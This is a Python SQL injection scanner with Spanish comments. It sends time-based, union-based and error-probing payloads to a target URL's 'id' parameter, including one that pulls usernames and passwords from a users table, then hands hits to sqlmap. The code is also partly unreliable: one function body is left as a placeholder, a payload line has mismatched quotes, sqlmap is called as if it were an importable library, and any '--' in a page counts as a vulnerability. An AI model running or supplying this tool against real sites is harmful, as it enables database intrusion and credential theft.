import requests
from bs4 import BeautifulSoup
import re
import sqlmap

def generate_payloads():
    """Genera una lista de payloads comunes para inyección SQL.

    Returns:
        list: Una lista de cadenas representando los payloads.
    """

    payloads = []

    # Payloads básicos, numéricos, alfanuméricos y basados en errores
    # ... (código de la función generate_payloads anterior)

    # Payloads basados en tiempo (más sofisticados)
    payloads.extend([
        "' AND IF(SUBSTRING(user,1,1)='a',BENCHMARK(1000000,SHA1('a')),NULL)",
        "' AND SLEEP(5)",
        "' AND IF(SUBSTRING(database(),1,1)='s',BENCHMARK(1000000,SHA1('a')),NULL)"
    ])

    # Payloads union-based
    payloads.append("' UNION SELECT username,password FROM users")

    # Payloads out-of-band (requiere un servidor de escucha)
    # payloads.append("' AND (SELECT * FROM(SELECT CONCAT(0x7e,(SELECT user FROM users LIMIT 1),0x7e,0x71))a)')

    return payloads

def send_request(url, payload):
    """Envía una solicitud HTTP a la URL especificada con el payload inyectado.

    Args:
        url (str): La URL de la página web.
        payload (str): El payload SQL a inyectar.

    Returns:
        requests.Response: La respuesta HTTP.
    """

    try:
        response = requests.get(url, params={'id': payload})
        response.raise_for_status()  # Levanta una excepción si la solicitud falla
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error al realizar la solicitud: {e}")
        return None

def is_vulnerable(response_text):
    """Determina si la respuesta indica una posible vulnerabilidad de inyección SQL.

    Args:
        response_text (str): El contenido de la respuesta HTTP.

    Returns:
        bool: True si se detecta una vulnerabilidad, False en caso contrario.
    """

    # Buscar patrones comunes de error de SQL
    error_patterns = ["SQL syntax.*error", "You have an error in your SQL syntax", "Incorrect syntax near"]
    for pattern in error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True

    # Buscar cambios en el contenido de la página
    # ... (implementar lógica para detectar cambios)

    # Buscar comentarios SQL
    if "--" in response_text:
        return True

    # Buscar tiempos de respuesta inusuales
    # ... (implementar lógica para medir el tiempo de respuesta)

    return False

def sql_injection_scanner(url):
    """Escanea una URL en busca de vulnerabilidades de inyección SQL.

    Args:
        url (str): La URL a escanear.
    """

    payloads = generate_payloads()

    for payload in payloads:
        response = send_request(url, payload)
        if response:
            if is_vulnerable(response.text):
                print(f"Posible vulnerabilidad encontrada en {url} con el payload: {payload}")
                # Utilizar sqlmap para un análisis más profundo
                sqlmap.run(["-u", url, "--data", payload])

# Ejemplo de uso
url = "http://example.com/vulnerable_page.php"
sql_injection_scanner(url)